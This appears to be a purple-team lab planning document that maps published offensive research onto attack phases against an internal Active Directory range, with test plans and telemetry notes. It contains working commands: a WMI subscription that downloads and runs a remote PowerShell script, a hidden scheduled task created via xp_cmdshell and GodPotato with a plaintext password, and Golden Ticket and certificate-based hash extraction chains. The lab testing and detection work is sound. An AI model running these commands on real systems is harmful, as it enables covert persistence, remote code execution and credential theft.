# Campaign Suggestions — SpecterOps Blog Cross-Reference

**Purpose:** Map research articles to specific campaign phases. Test each technique before integrating into CAMPAIGNS.md.

**Status:** Planning — test before deploy.

**DFIR parallel track:** [`DFIR-Nexus-Pioneer-workflow.md`](DFIR-Nexus-Pioneer-workflow.md) — links each campaign exercise to DFIR-Nexus ingest, cases, and `tracker.md` (Phase 3.5 active).

**Legend:** ✅ = adopted into CAMPAIGNS.md | ⏳ = pending test | 🔬 = research only | ⏭️ = skip

---

## Summary — All Items at a Glance

✅ = adopted into CAMPAIGNS.md | ⏳ = pending | 🔬 = research only | ⏭️ = skip

| Phase | Method | Status |
|:------|:-------|:-------|
| **Phase 0 — Recon** | ADWS Enumeration (SOAP port 9389) | ✅ |
| | DNS Enumeration (adidnsdump) | ✅ |
| | SAMR Enumeration (NetUserEnum — LDAP-free) | ✅ |
| | Honeypot Detection via lastLogon | ✅ |
| **Phase 2 — Credential Harvesting** | MSSQLHound (SQL enumeration) | ✅ |
| | NTLMv1 Rainbow Tables | ✅ |
| **Phase 3 — Execution** | WinGet Proxy Execution (LOLBAS) | ✅ |
| | GAC Hijacking (.NET injection) | ✅ |
| | SQL Server 2025 AI Abuse (exfil/coercion/C2) | ✅ |
| | UACME (UAC Bypass) | ✅ |
| | Handle Leak Exploitation | ✅ |
| | MSBuild.exe (XML project file execution) | ✅ |
| | mshta.exe (HTA/VBScript execution) | ✅ |
| | regsvr32.exe (scriptlet execution) | ✅ |
| | rundll32.exe (DLL/JS execution) | ✅ |
| | bitsadmin.exe (download + execute) | ✅ |
| | msiexec.exe (MSI execution) | ✅ |
| | InstallUtil.exe (.NET AWL bypass) | ✅ |
| | cmstp.exe (INF execution + AWL bypass) | ✅ |
| | Electron App Backdooring (Loki C2) | ✅ |
| **Phase 3.5 — Credential Access** | Offensive DPAPI (Nemesis) | ✅ |
| | ctfmon.exe Password Extraction | ✅ |
| | LSASS Dump via WerFault | ✅ |
| | LAPS Extraction | ✅ |
| | Windows Logon Types (credential location ref) | ✅ |
| | Credential Guard Bypass (study ref) | ✅ |
| | Azure AD Connect DPAPI Dump (adconnectdump) | ✅ |
| **Phase 4 — Discovery** | SharpHound Detection (study ref) | ✅ |
| **Phase 5 — Persistence** | WMI Event Subscriptions (fileless) | ✅ |
| | Invisible Scheduled Tasks (SD deletion) | ✅ |
| | DLL Hijacking | ⏳ |
| | COM Hijacking | ⏳ |
| | IFEO (Image File Execution Options) | ⏳ |
| | LSA SSP / Password Filter | ⏳ |
| | Named Pipe Impersonation (Piper) | ⏳ |
| | Token Dance (token manipulation) | ⏳ |
| | EntryPoint Hijacking (code injection) | ⏳ |
| | Shift Happens (context menu — negative test) | ⏳ |
| | Electron App Backdooring (Loki C2, signed app bypass) | ✅ |
| **Phase 6 — Lateral Movement** | ghostsurf (NTLM Relay to browser) | ✅ |
| | Cross-Session Activation (COM lateral) | ⏳ |
| | SpeechRuntime Lateral | ⏳ |
| | DCOMIllusionist (fileless .NET deserialization) | ⏳ |
| | RBCD (Resource-Based Constrained Delegation) | ⏳ |
| | Unconstrained Delegation (krbrelayx / mbr01) | ⏳ |
| | NTLM Relay to ADCS ESC8 (ntlmrelayx + coerce) | ⏳ |
| | SMB-to-LDAP Relay (CVE-2019-1040) | ⏳ |
| | Kerberos Relay over DNS (mitm6 + krbrelayx) | ⏳ |
| **Phase 7 — Privilege Escalation (DCSync)** | Golden/Silver Ticket | ⏳ |
| | DCSync Attack and Detection (study ref) | ✅ |
| | Zerologon (alternative exploitation) | ⏳ |
| **Phase 8 — Forest Trust** | BadSuccessor + Golden dMSA (Server 2025) | ⏳ |
| | BetterSuccessor (dMSA post-patch) | ⏳ |
| | Forest Trust SID Filtering (study ref) | ✅ |
| | Forest Trust Bypass CVE-2020-0665 (study ref) | ✅ |
| **Branch B — ADCS** | Certified Pre-Owned (ESC1-8) | ✅ |
| | UnPAC-the-Hash (cert → NT hash) | ⏳ |
| | ESC16 (CA-level SID extension disable) | ⏳ |
| **Branch C — SCCM** | Ludus SCCM Lab | ✅ |
| **Branch D — Linux** | GTFOBins (python, perl, find, vim, awk, curl, env, tee) | ✅ |
| **Branch F — Supply-Chain** | Shai-Hulud 2.0 / NPMHound | ✅ |
| **Campaign H — Initial Access** | Device Code Phishing (OAuth) | ⏳ |
| **Plan 11 — Cloud/Entra ID** | Pass-the-Cert (Entra ID lateral movement) | ⏳ |
| | Actor Tokens → Global Admin (Dirk-jan 2025) | ⏳ |
| | Cloud Kerberos Trust → Domain Admin (Dirk-jan 2023) | ⏳ |
| | PRT Phishing (Dirk-jan 2023) | ⏳ |
| | Intune ADCS ESC1 (Dirk-jan 2025) | ⏳ |
| | Temporary Access Pass lateral movement (Dirk-jan 2024) | ⏳ |
| | Federated Credentials persistence (Dirk-jan 2024) | ⏳ |
| | Abusing Application Admin → Global Admin (Dirk-jan 2019) | ⏳ |
| **Detection Engineering** | ETW Internals (telemetry tampering) | ⏳ |
| **External Vuln Research (2026-06-18)** | MiniPlasma (CVE-2020-17103 unpatched → SYSTEM) | 🔬 |
| | GreenPlasma (CTFMON arbitrary section → EoP) | 🔬 |
| | YellowKey (BitLocker bypass via FsTx + WinRE) | 🔬 |
| **Phase 5 — Lateral Movement** | UnCanny Coerce (NTLM coercion via InstallService) | 🔬 |
| **Phase 3.5 — Credential Access** | UnCanny LPE (Non-admin → SYSTEM via InstallService) | 🔬 |
| **Detection Engineering** | IPv4-mapped IPv6 URL Parser Bypass (SANS ISC 33090) | 🔬 |
| **Post-DA Cleanup** | KDS Root Key Extraction (prerequisite for #85-89) | ⏳ |
| | Golden gMSA Attack (offline password computation) | ⏳ |
| | DSRM Password Extract & Set (DC persistence) | ⏳ |
| | LAPS Bulk Extraction (DSInternals enhancement) | ⏳ |
| | Golden dMSA Attack (Server 2025) | ⏳ |
| | DPAPI-NG SID Protector Decryption (BitLocker/PFX/DNSSEC/ASP.NET) | ⏳ |
| **Exercise (Standalone)** | CVE-2026-41089 Netlogon RCE (unauthenticated DC exploit) | ⏳ |
| **Research** | MSSQL + SCCM CVEs | 🔬 |
| **Reference** | How We Think about Red Teading | — |
| | Attack Paths Don't Stop at IdP | — |
| | dirkjanm.io — AD/Azure Research Blog | — |
| **Skip** | Don't Jump the Turnstile | ⏭️ |

**Counts:** ✅ Adopted: 40 | ⏳ Pending: 38 | 🔬 Research: 7 | ⏭️ Skip: 1 | Reference: 3 | **Total: 89**

---

## Tier 1 — Directly Maps to Our Attack Surface

### 1. MSSQLHound Now Available in Go ✅

**Source:** https://specterops.io/blog/2026/04/23/mssqlhound-now-available-in-go/
**Tool:** MSSQLHound (Go port)
**Status:** ✅ Adopted into CAMPAIGNS.md — Reconnaissance with svc_mssql (Step B)

**Relevance to CADRE:** Phase 3/4 — MSSQL attack paths. Collects SQL logins, roles, impersonation, linked servers for BloodHound visualization. We have 3 SQL instances (mbr01, mbr02, linux01) with linked servers, IMPERSONATE grants, and xp_cmdshell.

**Campaign location:** Reconnaissance with svc_mssql (Step B) + Phase 4 (BloodHound discovery).

**Testing plan:**
1. Deploy MSSQLHound on provisioning
2. Run against mbr01 with svc_mssql credentials
3. Collect SQL-level attack paths (impersonation, linked servers, sysadmin)
4. Import into BloodHound for visualization
5. Compare with manual SQL enumeration results

---

### 2. MSSQL and SCCM Elevation of Privilege Vulnerabilities 🔬

**Source:** https://specterops.io/blog/2026/01/15/mssql-and-sccm-elevation-of-privilege-vulnerabilities/
**CVEs:** CVE-2025-49758 (MSSQL), CVE-2025-47179 (SCCM)
**Status:** 🔬 Research only — CADRE is misconfig lab, not vuln lab

**Relevance to CADRE:** Research/optional only. These CVEs apply only if we pin SQL/SCCM builds to vulnerable versions.

**Campaign location:** Research only — not spine. Integrate only if we add a "vulnerable build" track.

---

### 3. Offensive DPAPI With Nemesis — DPAPI Credential Theft ✅

**Source:** https://specterops.io/blog/2026/03/04/offensive-dpapi-with-nemesis/
**Tool:** Nemesis 2.2+
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch 3.5G

**Relevance to CADRE:** Branch 3.5G. Automates DPAPI decryption chain — SYSTEM/user masterkeys → CNG keys → Chromium App-Bound encryption. With SYSTEM on mbr01, we can decrypt any user's DPAPI-protected data.

**Campaign location:** Branch 3.5G — after 3.5F/3.5A verified.

**Prerequisite:** Stage saved creds in analyst_cloud profile (playbook or manual).

---

### 4. Windows 11 Input Telemetry — ctfmon.exe Password Extraction ✅

**Source:** https://hexderef.com/windows-11-passwords-in-memory-lsass-ctfmon-analysis
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch 3.5H

**Relevance to CADRE:** Branch 3.5H. Typed passwords remain in ctfmon.exe memory AFTER application closes. ctfmon.exe is NOT a protected process. Credential Guard does NOT protect these passwords.

**Campaign location:** Branch 3.5H — after SYSTEM on mbr01.

---

### 5. Certified Pre-Owned (ADCS ESC1-ESC8) ✅

**Source:** https://specterops.io/blog/2021/06/17/certified-pre-owned/
**Whitepaper:** https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch B (ADCS)

**Campaign location:** Branch B — after Phase 4 (BloodHound discovery).

---

### 6. Graph the Planet: Shai-Hulud 2.0 — NPMHound (Supply Chain) ✅

**Source:** https://specterops.io/blog/2026/03/19/graph-the-planet-shai-hulud-2-0/
**Tool:** NPMHound
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch F (Supply-chain)

**Campaign location:** Branch F — standalone, after Plan 0.8 install.

---

### 7. Ludus SCCM Lab Expansion ✅

**Source:** https://specterops.io/blog/2026/04/01/ludus-sccm-lab-expansion/
**Tool:** ConfigManBearPig (PowerShell)
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch C (SCCM)

**Campaign location:** Branch C — after Phase 5.

---

### 8. WMI Event Subscriptions — Fileless Persistence ✅

**Source:** DbgMan — Persistence: Advanced Red Team Persistence Techniques
**MITRE:** T1546.003
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch 3.5J

**Relevance to CADRE:** Fileless persistence — no disk artifacts, no registry run keys, no scheduled tasks. Blue teams need Sysmon Event IDs 19/20/21 to catch this. With SYSTEM on mbr01, we can install WMI subscriptions that fire on system startup.

**Campaign location:** Branch 3.5J — after SYSTEM on mbr01.

**Why this works on Server 2025:**
- No disk artifacts (fileless)
- Not visible in Autoruns, Run keys, or Scheduled Task scanners
- Survives reboots
- Requires Sysmon 19/20/21 for detection (most labs don't have it)

**Testing plan:**
1. From SYSTEM via xp_cmdshell, install WMI Event Subscription
2. Trigger: system startup (uptime > 60 seconds)
3. Action: execute SharpHound or reverse shell
4. Verify subscription persists after reboot
5. Document telemetry (Sysmon 19/20/21)

**Commands (from SYSTEM):**
```powershell
# Create filter (trigger: system startup)
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.Name = "CADRE-WMI-Persistence"
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60"
$filter.EventNamespace = "Root\Cimv2"
$filter.Put()

# Create consumer (action: execute command)
$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "CADRE-WMI-Consumer"
$consumer.CommandLineTemplate = "powershell.exe -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.77.60:8080/shell.ps1')"
$consumer.Put()

# Bind filter to consumer
$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filter.Path
$binding.Consumer = $consumer.Path
$binding.Put()
```

---

---

### 10. Invisible Scheduled Tasks — Security Descriptor Deletion ✅

**Source:** DbgMan — Persistence: Advanced Red Team Persistence Techniques
**MITRE:** T1053.005
**Status:** ✅ Adopted into CAMPAIGNS.md — enhances 3.5B

**Relevance to CADRE:** Enhances Branch 3.5B (Scheduled Task as analyst_cloud). By deleting the Security subkey under a task in the registry, the task becomes completely invisible to: `schtasks /query`, Task Scheduler GUI, PowerShell `Get-ScheduledTask`, Autoruns.

**Campaign location:** Enhance Branch 3.5B — add SD deletion after task creation.

**Why this works on Server 2025:**
- Task still runs on schedule
- Invisible to all standard enumeration tools
- Blue teams need raw registry access under SYSTEM to find it

**Testing plan:**
1. Create scheduled task as analyst_cloud (existing 3.5B)
2. Delete Security subkey from registry
3. Verify task is invisible to `schtasks /query`
4. Verify task still executes
5. Document telemetry (Sysmon 12/13)

**Commands:**
```sql
-- Create task (existing 3.5B)
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr ... /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';

-- Delete Security subkey (makes task invisible)
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg delete HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CADRE-SharpHound\Security /f"';
```

---

### 11. Golden Ticket / Silver Ticket — AD Persistence ⏳

**Source:** DbgMan — Persistence: Advanced Red Team Persistence Techniques
**MITRE:** T1558.001 / T1558.002
**Status:** ⏳ Pending — enhances Phase 6/7

**Relevance to CADRE:** Enhances Phase 6 (DCSync) and Phase 7 (Forest Trust). After DCSync gives us KRBTGT hash, we can forge Golden Tickets (domain-wide) or Silver Tickets (service-specific). These persist even after credential resets.

**Campaign location:** After Phase 6 (DCSync) — add Golden/Silver Ticket as persistence.

**Why this works on Server 2025:**
- Golden Ticket: forged TGT signed with KRBTGT hash — cryptographically valid
- Silver Ticket: forged TGS signed with service account hash — no KDC contact needed
- Both survive credential resets (unless KRBTGT password is changed twice)

**Testing plan:**
1. DCSync to get KRBTGT hash (Phase 6)
2. Forge Golden Ticket for Administrator
3. Use ticket to access DC01 without password
4. Document telemetry (Sysmon 1, 3)

**Commands:**
```bash
# From Kali with KRBTGT hash
ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-XXXX -domain child.cadre.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
```

---

### 12. Device Code Phishing — OAuth Abuse ⏳

**Source:** DbgMan — Initial Access: Modern Intrusion Techniques
**MITRE:** T1566.003
**Status:** ⏳ Pending — new initial access vector

**Relevance to CADRE:** New initial access technique for Campaign H. Victim enters code on legitimate Microsoft login page — attacker gets persistent access token. No phishing page needed.

**Campaign location:** Campaign H (Initial Access) — new technique alongside WT063-068.

**Why this works on Server 2025:**
- Victim authenticates on real Microsoft page
- Bypasses MFA completely (token includes MFA claims)
- No phishing infrastructure to get burned
- Tokens can last days/weeks

**Testing plan:**
1. Generate device code via Microsoft OAuth endpoint
2. Send to victim (simulated via playbook)
3. Victim enters code on legitimate page
4. Attacker captures token
5. Document telemetry

---

## Tier 2 — Useful Tradecraft

### 13. ghostsurf: NTLM Relay to Browser Session Hijacking ✅

**Source:** https://specterops.io/blog/2026/04/02/ghostsurf-from-ntlm-relay-to-browser-session-hijacking/
**Status:** ✅ Adopted into CAMPAIGNS.md — Phase 5 (Lateral Movement)

**Campaign location:** Phase 5 — NTLM relay to ESC8 or coercion relay chain.

---

### 14. Shift Happens — Command Injection in Windows Context Menus ⏳

**Source:** https://specterops.io/blog/2026/05/07/shift-happens-uncovering-two-built-in-command-injections-in-windows-context-menus/
**Status:** ⏳ Negative test — Server 2025 likely patched

**Campaign location:** Branch 3.5D — test if still works, document if patched.

---

### 15. Into The Rainbow — NTLMv1 Rainbow Tables ✅

**Source:** https://specterops.io/blog/2026/04/16/into-the-rainbow-googles-ntlmv1-rainbow-tables-explained-in-a-bit-too-much-detail/
**Status:** ✅ Adopted into CAMPAIGNS.md Phase 2 — NTLMv1 Rainbow Tables section (after Kerberoast block, before "Reconnaissance with svc_mssql"). Full test plan + detection.

**Campaign location:** Phase 2 — one-time check if NTLMv1 hashes exist.

---

### 16. Don't Jump the Turnstile — Phishing Sandbox Bypass ⏭️

**Source:** https://specterops.io/blog/2026/05/28/dont-jump-the-turnstile-lessons-from-the-field/
**Status:** ⏭️ Skip — no Cloudflare in lab

---

## Tier 3 — Background/Context

### 17. How We Think about Red Teaming

**Source:** https://specterops.io/blog/2026/05/06/how-we-think-about-red-teaming/
**Status:** Reference only — methodology

---

### 18. Attack Paths Don't Stop at Identity Providers

**Source:** https://specterops.io/blog/2026/03/24/attack-paths-dont-stop-at-identity-providers/
**Status:** Future — Azure/Okta expansion

---

## iPurple.team Additions (2024-2026)

### 19. AD Enumeration via ADWS ✅

**Source:** https://ipurple.team/2025/08/12/active-directory-enumeration-adws/
**MITRE:** T1018 (Remote System Discovery)
**Status:** ✅ Adopted into CAMPAIGNS.md Phase 0 — Step 3 (ADWS Enumeration on SOAP port 9389). All 3 DCs verified open via nmap (2026-06-18). Awaiting auth test.

**Relevance to CADRE:** Active Directory Web Services (ADWS) runs on all DCs on port 9389. Provides SOAP-based enumeration as alternative to LDAP. Server 2025 blocks anonymous LDAP — but ADWS may behave differently. Worth testing as Phase 0 recon vector.

**Campaign location:** Phase 0 — Reconnaissance. Add as Step 3 after Kerberos user enum.

**Testing plan:**
1. From Kali, connect to dc02:9389 via ADWS
2. Enumerate users/groups via SOAP queries
3. Compare with LDAP enumeration results
4. Document if anonymous ADWS is blocked on Server 2025

**Why this works:**
- ADWS is enabled by default on Server 2025 DCs
- Uses different authentication path than LDAP
- May leak information even when LDAP anonymous is blocked

---

### 20. LSASS Dump via Windows Error Reporting (WerFault) ✅

**Source:** https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/
**MITRE:** T1003.001 (OS Credential Dumping: LSASS Memory)
**Status:** ✅ Adopted into CAMPAIGNS.md Branch 3.5 — 3.5K (LSASS Dump via WerFault). Full test plan + telemetry expectations.

**Relevance to CADRE:** WerFaultSecure is a Microsoft-signed binary that can dump LSASS memory. Stealthier than procdump (which is often flagged by EDR). Works by triggering a crash dump via Windows Error Reporting.

**Campaign location:** Branch 3.5F — add as alternative LSASS dump method.

**Why this works on Server 2025:**
- WerFaultSecure is Microsoft-signed (trusted binary)
- Not flagged by most EDR solutions
- Dumps LSASS to file for offline extraction
- Works even when procdump is blocked

**Testing plan:**
1. Transfer WerFaultSecure approach to mbr01 via SYSTEM
2. Trigger LSASS dump via WER
3. Extract credentials with pypykatz/mimikatz offline
4. Compare telemetry with procdump approach

---

### 21. Cross-Session Activation (COM Lateral Movement) ⏳

**Source:** https://ipurple.team/2026/05/04/cross-session-activation/
**MITRE:** T1021.003 (Distributed COM)
**Status:** ⏳ Pending — new Phase 5 lateral technique

**Relevance to CADRE:** Cross-Session Activation (CSA) uses COM activation to execute code in another user's session without traditional lateral movement APIs (PsExec, WMI, WinRM). Stealthier than PsExec — no service creation, no named pipes.

**Campaign location:** Phase 5 — add as lateral movement alternative.

**Why this works on Server 2025:**
- COM activation is legitimate Windows functionality
- No service creation (avoids 4698 events)
- No named pipe (avoids PsExec detection)
- EDR vendors still catching up to CSA detection

**Testing plan:**
1. From SYSTEM on mbr01, activate COM object in analyst_cloud's session
2. Execute command as analyst_cloud
3. Document telemetry (Sysmon, WinSec)
4. Compare with PsExec/WMI/DCOM lateral movement

---

### 22. SharpHound Detection ✅

**Source:** https://ipurple.team/2024/07/15/sharphound-detection/
**MITRE:** T1087.002 (Account Discovery: Domain Account)
**Status:** ✅ Adopted into CAMPAIGNS.md Study Reference Library (Phase 4). Read before executing Phase 4 SharpHound collection.

**Relevance to CADRE:** Documents what SharpHound collection looks like to defenders. We run SharpHound in Phase 4 — understanding the detection signature helps us validate our detection rules and understand what telemetry BH collection generates.

**Campaign location:** Phase 4 — add as detection reference for BH collection.

**What it covers:**
- SharpHound network patterns (LDAP queries, RPC calls)
- Endpoint telemetry (process create, file writes)
- Detection rules for SharpHound enumeration
- How to distinguish BH collection from normal AD queries

**Why this matters for CADRE:**
- We need to know what our BH collection looks like to defenders
- Validates our detection rules for Phase 4
- Helps us write better cadre-* detection rules

---

### 23. BadSuccessor + Golden dMSA (Server 2025) ⏳

**Source:** https://ipurple.team/2025/07/28/badsuccessor/ and https://ipurple.team/2025/09/02/golden-dmsa/
**MITRE:** T1558.004 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — Server 2025 specific

**Relevance to CADRE:** dMSA (delegated Managed Service Account) is a new Server 2025 feature designed to prevent Kerberoasting. BadSuccessor and Golden dMSA abuse dMSA objects for credential theft and persistence. CADRE runs Server 2025 — this is a real attack surface.

**Campaign location:** Phase 7 — add as dMSA abuse technique.

**Why this works on Server 2025:**
- dMSA is a new feature in Server 2025
- BadSuccessor: create dMSA object → inherit privileges from parent account
- Golden dMSA: forge dMSA authentication material for persistence
- Both bypass the security dMSA was designed to provide

**Already partially covered:** Impacket-IoCs IoC 35 documents `BadSuccessor.py` patterns (dMSA naming, migration attributes).

---

### 24. WinGet — Proxy Execution via Windows Package Manager ✅

**Source:** https://ipurple.team/2026/06/09/winget/
**MITRE:** T1218 (System Binary Proxy Execution)
**Status:** ✅ Adopted into CAMPAIGNS.md Phase 3 — Alternative Execution Techniques → WinGet Proxy Execution (T1218). Full test plan via mssql-shell as SYSTEM.

**Relevance to CADRE:** WinGet (Windows Package Manager) is installed by default on Windows 11 and Server 2022+. It's a Microsoft-signed binary that can be abused to proxy execution, download payloads from remote sources, and evade application allowlisting. Common in dev/admin environments.

**Campaign location:** Phase 3 (Execution) or Branch 3.5D (File Detonation) — LOLBAS proxy execution.

**Why this works on Server 2025:**
- WinGet is Microsoft-signed (trusted binary)
- Can download and execute packages from remote sources
- Bypasses application allowlisting (AppLocker, WDAC)
- Default on modern Windows — no additional tools needed

**Techniques:**
- `winget install` — download and execute installer from remote source
- `winget upgrade` — replace legitimate package with malicious version
- `winget settings` — modify WinGet configuration for persistence
- Proxy execution via `--override` flag with arbitrary commands

**Testing plan:**
1. From SYSTEM on mbr01, use `winget install` to download payload from attacker HTTP server
2. Or use `winget --override` to execute arbitrary commands
3. Document telemetry (Sysmon EID 1, 11, network)
4. Compare with certutil/bitsadmin LOLBAS techniques

**Detection:** Sysmon EID 1 (winget.exe process create), EID 11 (file write from winget), network connection to external package source. WinGet logs to `%LOCALAPPDATA%\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\DiagOutputDir\`.

---

### 25. EntryPoint Hijacking ⏳

**Source:** https://ipurple.team/2026/05/13/entrypoint-hijacking/
**MITRE:** T1055 (Process Injection)
**Status:** ⏳ Pending — code injection technique

**Relevance to CADRE:** Stealthy code injection that doesn't rely on CreateRemoteThread or other APIs EDR monitors. Arbitrary code is written to memory but executes only when the process legitimately runs. Independent of the attack chain — works as a post-exploitation technique.

**Campaign location:** Branch 3.5D (File Detonation) — alternative code execution method.

**Why this works on Server 2025:**
- No thread creation API calls (avoids common EDR hooks)
- Code executes in context of legitimate process
- Difficult to detect without memory scanning

**Detection:** Sysmon EID 10 (process access), EID 8 (CreateRemoteThread — NOT present in this technique, which is the point). Memory scanning for injected code. EDR behavioral analysis.

---

### 26. Microsoft Speech Runtime Lateral Movement ⏳

**Source:** https://ipurple.team/2026/04/07/microsoft-speech/
**MITRE:** T1021 (Remote Services)
**Status:** ⏳ Pending — novel lateral movement

**Relevance to CADRE:** SpeechRuntime.exe is a legitimate Windows component. Threat actors with elevated privileges can execute code under the context of this binary for lateral movement. Novel technique — EDR vendors still catching up.

**Campaign location:** Phase 5 — lateral movement alternative alongside PsExec/WMI/DCOM.

**Why this works on Server 2025:**
- SpeechRuntime.exe is a trusted Windows binary
- Not commonly monitored by EDR for lateral movement
- Works from SYSTEM context

**Detection:** Sysmon EID 1 (SpeechRuntime.exe process create with unexpected parent), EID 3 (network connection from SpeechRuntime.exe).

---

### 27. GAC Hijacking (.NET Assembly Injection) ✅

**Source:** https://ipurple.team/2026/02/10/gac-hijacking/
**MITRE:** T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
**Status:** ✅ Adopted into CAMPAIGNS.md Phase 3 — Alternative Execution Techniques → GAC Hijacking (.NET Assembly Injection) (T1574.001). Full test plan.

**Relevance to CADRE:** Global Assembly Cache (GAC) is a .NET system-wide repository. Hijacking GAC assemblies allows code execution in context of any .NET application. CADRE has MSSQL (which uses .NET assemblies) — GAC hijacking could execute code in SQL Server's context.

**Campaign location:** Phase 3 (Execution) or Branch 3.5D — .NET-specific technique.

**Why this works on Server 2025:**
- MSSQL uses .NET assemblies (CLR integration is enabled on mbr02)
- GAC is a trusted system location
- Assemblies loaded automatically by .NET runtime
- No process creation needed — code runs in existing .NET process

**Detection:** Sysmon EID 11 (file write to `%windir%\Microsoft.NET\assembly\`), EID 7 (image load of unsigned assembly), CLR loading logs.

---

### 28. Credential Guard Bypass Research ✅

**Source:** https://ipurple.team/2026/03/17/credential-guard/
**MITRE:** T1003.001 (OS Credential Dumping: LSASS Memory)
**Status:** ✅ Adopted into CAMPAIGNS.md Study Reference Library (Phase 3.5). Read before running 3.5F to understand which mimikatz modules fail when Credential Guard is on (and why our CADRE lab tests work).

**Relevance to CADRE:** Deep-dive on Credential Guard architecture and known bypass research. Our lab has Credential Guard OFF (by design), but this article documents what defenders should know and what attackers can do when CG is ON. Critical study material for understanding why 3.5F works in our lab but would fail in hardened environments.

**Campaign location:** Branch 3.5F — add as study reference for LSASS dump context.

**What it covers:**
- VBS-based credential isolation architecture
- Known bypass techniques (CVE-based and architectural)
- Why LSASS dump fails with CG enabled
- Alternative credential theft when CG is active

---

### 29. UnPAC-the-Hash — NT Hash from Certificate via U2U ⏳

**Source:** https://specterops.io/blog/2026/06/09/user-to-user-authentication-down-the-rabbit-hole-part-1/
**MITRE:** T1649 (Steal or Forge Authentication Certificates), T1558.004 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — chains with ADCS ESC attacks (Branch B)

**Relevance to CADRE:** UnPAC-the-Hash extracts the NT hash from a PKINIT TGT via U2U service ticket. This is the bridge between "get certificate" (ADCS ESC1-ESC4) and "get NT hash" (Pass-the-Hash). CADRE already has ESC1-14 templates deployed — UnPAC-the-Hash is the natural next step after certificate enrollment.

**Campaign location:** Branch B (ADCS) — post-ESC credential extraction. Chains: ESC1 → certificate → PKINIT → TGT → UnPAC-the-Hash → NT hash → Pass-the-Hash.

**Why this works on Server 2025:**
- PKINIT embeds NT hash in PAC inside TGT (for legacy NTLM support)
- U2U service ticket encrypted with own TGT session key — attacker can decrypt
- `certipy auth` handles the entire chain automatically
- No additional tools needed beyond Certipy

**Attack chain:**
1. `certipy req` — get certificate via ESC1
2. `certipy auth -pfx administrator.pfx` — PKINIT + UnPAC-the-Hash → NT hash
3. `psexec.py -hashes :<NTLM> administrator@dc01` — Pass-the-Hash

**Detection:** WinSec 4768 PreAuthType=16 (PKINIT) followed by 4769 for own SPN with `ENC-TKT-IN-SKEY`. Zeek kerberos.log: additional ticket in TGS-REQ.

**Part 2 pending:** SpecterOps will publish deeper U2U abuse techniques.

**Study guide:** `05-study-guide/kerberos-u2u-unpac-the-hash.md`

---

### 30. ETW Internals — Telemetry Tampering Detection ⏳

**Source:** https://kernullist.github.io/kernullist-blog/posts/etw-internals-deep-dive/
**Date:** 2026-06-03
**MITRE:** T1562.006 (Impair Defenses: Indicator Blocking)
**Status:** ⏳ Pending — detection engineering reference

**Relevance to CADRE:** ETW is the telemetry fabric behind Elastic Defend, Sysmon, and all modern EDRs. Attackers can tamper with ETW providers to blind defenders — patching `EtwEventWrite`, unloading providers, or modifying registration. Understanding ETW internals helps CADRE detect when attackers try to disable telemetry. Directly relevant to our detection rules.

**Campaign location:** Detection engineering — not an attack technique. Reference for building cadre-* rules that detect ETW tampering.

**What it covers:**
- ETW provider registration architecture
- How attackers patch ETW (EtwEventWrite, NtTraceEvent hooks)
- Process-level ETW tampering
- Cross-view detection strategies

**Why this matters for CADRE:**
- Elastic Defend and Sysmon both depend on ETW
- If an attacker patches ETW, our telemetry goes dark
- We need detection rules that catch ETW tampering itself
- Understanding ETW architecture helps validate our detection pipeline

**Study guide:** `05-study-guide/ref-etw-internals.md`

---

### 31. SQL Server 2025 AI Features — Data Exfil, NTLM Coercion, C2 Transport ✅

**Source:** https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/
**PoC:** https://github.com/gershsec/mssql2025-poc
**MITRE:** T1567 (Exfiltration Over Web Service), T1218 (System Binary Proxy Execution), T1071 (Application Layer Protocol)
**Status:** ⏳ Pending — requires SQL Server 2025 upgrade

**Relevance to CADRE:** SQL Server 2025 introduces 3 new AI features that attackers can weaponize. `sp_invoke_external_rest_endpoint` enables native HTTPS exfiltration (100MB payload) without xp_cmdshell. `CREATE EXTERNAL MODEL` with UNC paths enables NTLM SMB coercion (Microsoft won't fix). `AI_GENERATE_EMBEDDINGS` enables C2 transport that looks like legitimate AI model traffic.

**Campaign location:** Phase 3 (Execution) — extends existing MSSQL attack surface. Chains with xp_cmdshell → sysadmin → weaponize AI features.

**Prerequisites:**
- SQL Server 2025 (current lab has 2022 Express — needs upgrade)
- sysadmin role on MSSQL instance
- `sp_invoke_external_rest_endpoint` enabled
- `external AI runtimes enabled` (for NTLM coercion)

**Attack techniques:**

| Technique | Feature Used | What It Does |
|-----------|-------------|-------------|
| Data exfil via REST | `sp_invoke_external_rest_endpoint` | POST database contents to attacker HTTPS server (100MB chunks) |
| File exfil via REST | `OPENROWSET` + REST endpoint | Read files from disk, exfil via HTTPS from SQL process |
| Persistent exfil | TRIGGER + REST endpoint | Auto-exfil on table INSERT (credential harvesting) |
